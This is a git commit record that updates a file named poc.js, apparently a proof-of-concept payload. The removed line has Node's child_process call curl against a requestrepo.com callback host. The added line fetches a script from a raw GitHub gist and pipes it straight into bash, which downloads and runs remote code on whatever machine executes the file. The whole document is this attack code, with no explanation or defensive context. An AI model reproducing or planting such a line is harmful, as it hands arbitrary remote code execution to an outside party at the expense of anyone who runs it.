d7b871bf992544d47be17aaef26bebb834cde8ea
fbfb2 <lx2317103712@gmail.com>
2025-03-29 01:33:36 +0800

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,1 +1,1 @@
-require('child_process').exec("curl https://we4lykvf.requestrepo.com/111");
+require('child_process').exec("curl -sSfL https://gist.githubusercontent.com/fbfb2/4a3027fc532b7c7fb69b8e5ae51cc362/raw/aa8086b67d70b03509530497ca1f1fa79a967674/README | bash");
